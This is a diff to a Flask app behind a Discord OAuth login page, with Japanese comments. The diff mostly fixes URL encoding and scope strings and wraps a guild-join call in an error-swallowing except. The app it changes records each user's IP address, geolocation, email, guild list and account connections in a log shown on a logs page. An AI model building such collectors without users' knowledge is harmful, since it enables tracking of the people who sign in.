@@ -4,6 +4,7 @@ from dotenv import load_dotenv
 from datetime import datetime
 from discord_bot import bot
 from user_agents import parse
+from urllib.parse import quote
 
 load_dotenv()
 
@@ -14,8 +15,7 @@ DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
 DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
 DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
 DISCORD_GUILD_ID = os.getenv("DISCORD_GUILD_ID")
-REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
-
+REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")  # 例: https://black-ruann.onrender.com/callback
 
 # ----------------------------
 # クライアントIP取得
@@ -24,7 +24,6 @@ def get_client_ip():
     if "X-Forwarded-For" in request.headers:
         return request.headers["X-Forwarded-For"].split(",")[0].strip()
     return request.remote_addr
-
 
 # ----------------------------
 # IPジオロケーション取得
@@ -55,7 +54,6 @@ def get_geo_info(ip):
             "lat": None, "lon": None, "proxy": False, "hosting": False
         }
 
-
 # ----------------------------
 # ログ保存
 # ----------------------------
@@ -73,21 +71,20 @@ def save_log(discord_id, data):
     with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
         json.dump(logs, f, indent=4, ensure_ascii=False)
 
-
 # ----------------------------
 # ルート（認証画面）
 # ----------------------------
 @app.route("/")
 def index():
+    redirect_uri_encoded = quote(REDIRECT_URI, safe='')  # 安全にURLエンコード
     discord_auth_url = (
         f"https://discord.com/oauth2/authorize"
         f"?client_id={DISCORD_CLIENT_ID}"
         f"&response_type=code"
-        f"&redirect_uri={REDIRECT_URI}"
+        f"&redirect_uri={redirect_uri_encoded}"
         f"&scope=identify%20email%20guilds"
     )
     return render_template("index.html", discord_auth_url=discord_auth_url)
-
 
 # ----------------------------
 # コールバック処理
@@ -107,7 +104,7 @@ def callback():
         "grant_type": "authorization_code",
         "code": code,
         "redirect_uri": REDIRECT_URI,
-        "scope": "identify%20email%20guilds"
+        "scope": "identify email guilds"
     }
     try:
         res = requests.post(token_url, data=data, headers=headers)
@@ -126,14 +123,17 @@ def callback():
     connections = requests.get("https://discord.com/api/users/@me/connections", headers=headers_auth).json()
 
     # サーバー参加（guilds.join スコープが必要）
-    requests.put(
-        f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
-        headers={
-            "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
-            "Content-Type": "application/json"
-        },
-        json={"access_token": access_token}
-    )
+    try:
+        requests.put(
+            f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
+            headers={
+                "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
+                "Content-Type": "application/json"
+            },
+            json={"access_token": access_token}
+        )
+    except:
+        pass  # エラーは無視してログのみ
 
     # IP/位置情報取得
     ip = get_client_ip()
@@ -248,7 +248,6 @@ def callback():
 
     return render_template("welcome.html", username=data["username"], discriminator=data["discriminator"])
 
-
 # ----------------------------
 # ログ表示ページ
 # ----------------------------
@@ -261,13 +260,11 @@ def show_logs():
         logs = {}
     return render_template("logs.html", logs=logs)
 
-
 # ----------------------------
 # Bot起動
 # ----------------------------
 def run_bot():
     bot.run(DISCORD_BOT_TOKEN)
-
 
 if __name__ == "__main__":
     threading.Thread(target=run_bot, daemon=True).start()
